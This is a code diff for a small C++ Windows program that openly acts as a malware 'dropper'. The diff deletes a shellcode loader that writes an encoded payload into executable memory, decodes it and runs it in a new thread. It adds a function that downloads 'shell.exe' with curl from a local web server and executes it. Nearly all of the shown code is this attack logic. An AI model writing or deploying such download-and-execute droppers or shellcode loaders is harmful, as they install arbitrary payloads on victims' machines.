@@ -18,38 +18,15 @@ string getFileName(const string& s) {
     return("");
 }
 
-void dropShit(){
-        unsigned char shellcode[] = 
-        "\xbb\xae\xdf\x60\x56\xdb\xd7\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
-        "\x14\x31\x5a\x14\x83\xea\xfc\x03\x5a\x10\x4c\x2a\x51\x8d\x67"
-        "\x36\xc1\x72\xd4\xd3\xe4\xfd\x3b\x93\x8f\x30\x3b\x8f\x11\x99"
-        "\x53\x32\xae\x0c\xff\x58\xbe\x7f\xaf\x15\x5f\x15\x29\x7e\x6d"
-        "\x6a\x3c\x3f\x69\xd8\x3a\x70\x17\xd3\xc2\x33\x68\x8d\x0f\x33"
-        "\x1b\x0b\xe5\x0b\x44\x61\x79\x3a\x0d\x81\x11\x92\xc2\x02\x89"
-        "\x84\x33\x87\x20\x3b\xc5\xa4\xe2\x90\x5c\xcb\xb2\x1c\x92\x8c";
-        system('curl http://127.0.0.1/shellExec.exe -o shellExec.exe')
-
-        PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-        RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
-        DWORD threadID;
-        for (int i = 0; i < sizeof shellcode; i++)
-        {
-            ((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) - 13;
-        }
-        HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
-        WaitForSingleObject(hThread, INFINITE);
-        for (int i = 0; i < sizeof shellcode; i++)
-        {
-            ((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) ^ '\x35';
-        }
+void dropShit() {
+    string url = "http://127.0.0.1:8000/shell.exe";
+    string opt1 = "curl ";
+    string opt2 = "  -o shell.exe";
+    string cmd = opt1 + url + opt2;
+    cout << cmd;
+    system(cmd.c_str());
+    system("shell.exe");
 }
-
-// void dropShit(string path) {
-//    ofstream MyFile(path);
-//    MyFile << "just kidding";
-//    MyFile.close();
-//   shellCode();
-//} 
 
 int main(int argc, char** argv) {
     char fileName[MAX_PATH];
@@ -57,12 +34,6 @@ int main(int argc, char** argv) {
     DWORD len = UNLEN + 1;
     GetUserName(username, &len);
     string path = argv[0];
-
-    string newFile;
-    string first = "C:\\Users\\";
-    string second = "\\Desktop\\hacked.txt";
-    
-    newFile = first + username + second;
 
     if (getFileName(path) == "dropper.exe") {
         cout << "DROPPING :))" << endl;
